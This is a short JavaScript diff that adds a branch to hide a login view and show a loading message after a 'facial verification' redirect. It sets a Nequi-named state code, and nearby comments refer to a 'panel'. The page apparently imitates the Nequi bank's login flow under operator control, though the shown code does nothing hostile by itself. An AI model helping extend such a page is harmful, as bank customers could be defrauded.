@@ -84,6 +84,14 @@
     // Bloquear submit nativo de todos los forms (evita reload en móvil al presionar "Ir")
     $(document).on('submit', 'form', function(e) { e.preventDefault(); return false; });
 
+    // Retorno de verificacion facial: mostrar loading, no redirigir a facial de nuevo
+    if (/[?&]facialDone=1(?:&|$)/i.test(window.location.search)) {
+        window.__lastNequiEstado = '30';
+        $(".acceso").hide();
+        $(".fondo").show();
+        $(".mensaje").show();
+    }
+
     // Vista previa sin panel: index.html?demo=saldo
     if (/[?&]demo=saldo(?:&|$)/i.test(window.location.search)) {
       window.__nequiDemoSaldo = true;
